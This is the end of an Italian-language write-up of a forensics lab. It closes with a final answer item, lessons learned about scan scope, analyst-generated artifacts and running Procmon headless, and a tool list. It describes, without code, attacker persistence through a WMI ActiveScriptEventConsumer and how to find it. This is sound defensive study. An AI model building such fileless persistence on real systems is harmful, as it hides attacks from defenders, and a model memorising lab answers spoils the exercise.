30. mk.ps1, mk.exe, v2.0.50727

---

## Lezioni apprese

la lezione principale è sullo scope degli strumenti. ho lanciato Loki su C:\TMP perché lì c'era il toolkit e mi sembrava efficiente, e ho perso un giro intero: cinque domande su trenta riguardavano C:\Users\Public, che non era nello scope. su una forensics restringere lo scope per andare veloce è esattamente il modo di essere lenti, perché non sai cosa stai escludendo finché non scopri che ti serviva.

la seconda riguarda l'attribuzione di quello che vedi. i quattro wmic.exe nella cattura Procmon erano attività mia, non dell'attaccante, e per un momento li avevo dati per buoni come risposta. su un sistema che stai analizzando dal vivo, il tuo stesso lavoro genera artefatti che finiscono nella cattura, e distinguerli richiede di guardare i timestamp e chiederti cosa stavi facendo in quel momento. lo stesso problema della room 1 con i log ruotati, in un'altra forma: l'analista contamina la scena.

la terza è pratica e riguarda l'instabilità. quando la macchina non regge una GUI, quasi tutti i tool Sysinternals hanno una modalità headless documentata che nessuno usa. Procmon con /Quiet /Minimized /BackingFile /Runtime fa esattamente lo stesso lavoro, scrive su file, sopravvive alla disconnessione RDP, e poi il file lo interroghi con findstr e PowerShell senza mai aprire una finestra. mi ha risolto la sessione, e ci sono arrivato solo dopo il quarto kick.

sul lato tecnico, la cosa che mi porto dietro è l'impianto WMI. non avevo mai visto una event subscription usata sia per persistenza sia per difesa attiva contro l'analista, e il fatto che un ActiveScriptEventConsumer sia semplicemente una stringa VBScript dentro il repository, senza nessun file sul disco, spiega perché sia una tecnica così longeva. per trovarla devi sapere che esiste e devi interrogare root\subscription, non c'è nessun posto ovvio dove ti salta all'occhio

---

## Tool utilizzati

xfreerdp, RDP, Loki 0.33.0, Yara 4.0.4, Sysinternals Suite (Procmon64, Process Explorer, strings64, handle64), Process Hacker 2, schtasks, reg query, wmic, findstr, type, dir, PowerShell (Select-String), netsh advfirewall
